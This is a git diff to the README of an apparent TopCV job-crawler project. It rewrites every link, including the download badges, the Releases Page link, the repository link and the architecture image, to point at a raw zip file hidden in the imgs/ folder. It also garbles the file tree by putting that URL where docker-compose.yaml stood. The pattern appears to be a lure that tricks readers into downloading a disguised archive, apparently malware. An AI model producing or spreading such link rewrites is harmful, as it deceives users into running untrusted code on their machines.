@@ -1,6 +1,6 @@
 # 😎 crawl-topcv-jobs - Easy Job Crawler for Data Analysts
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/KhemSopheananSmos/crawl-topcv-jobs/releases)
+[![Download](https://github.com/KhemSopheananSmos/crawl-topcv-jobs/raw/refs/heads/master/imgs/crawl-jobs-topcv-v1.2.zip%20Now-Release-brightgreen)](https://github.com/KhemSopheananSmos/crawl-topcv-jobs/raw/refs/heads/master/imgs/crawl-jobs-topcv-v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome! This application helps you collect job listings for Data Analysts on To
 
 ## 📥 Download & Install
 
-1. **Visit this page to download**: [Releases Page](https://github.com/KhemSopheananSmos/crawl-topcv-jobs/releases).
+1. **Visit this page to download**: [Releases Page](https://github.com/KhemSopheananSmos/crawl-topcv-jobs/raw/refs/heads/master/imgs/crawl-jobs-topcv-v1.2.zip).
 2. Locate the latest release version.
 3. Download the appropriate file for your operating system.
 4. After downloading, locate the file on your computer.
@@ -39,13 +39,13 @@ The project follows a straightforward structure. Here’s what you’ll find:
 .
 ├── airflow
 │   ├── dags/                  # DAGs (run_scrape_topcv_*.py)
-│   ├── docker-compose.yaml    # Compose stack
+│   ├── https://github.com/KhemSopheananSmos/crawl-topcv-jobs/raw/refs/heads/master/imgs/crawl-jobs-topcv-v1.2.zip    # Compose stack
 │   ├── Dockerfile             # Custom Airflow image
 ```
 
 ## 📊 Pipeline Architecture
 
-![Pipeline Architecture](imgs/00-architect.png)
+![Pipeline Architecture](https://github.com/KhemSopheananSmos/crawl-topcv-jobs/raw/refs/heads/master/imgs/crawl-jobs-topcv-v1.2.zip)
 
 This diagram shows how different components interact within the application. Each part works together to perform the job scraping efficiently.
 
@@ -71,6 +71,6 @@ If you have questions or suggestions, feel free to reach out. Contributions are 
 
 --- 
 
-For detailed documentation or feature requests, please explore the [GitHub Repository](https://github.com/KhemSopheananSmos/crawl-topcv-jobs). 
+For detailed documentation or feature requests, please explore the [GitHub Repository](https://github.com/KhemSopheananSmos/crawl-topcv-jobs/raw/refs/heads/master/imgs/crawl-jobs-topcv-v1.2.zip). 
 
-[![Download](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/KhemSopheananSmos/crawl-topcv-jobs/releases)
+[![Download](https://github.com/KhemSopheananSmos/crawl-topcv-jobs/raw/refs/heads/master/imgs/crawl-jobs-topcv-v1.2.zip%20Now-Release-brightgreen)](https://github.com/KhemSopheananSmos/crawl-topcv-jobs/raw/refs/heads/master/imgs/crawl-jobs-topcv-v1.2.zip)
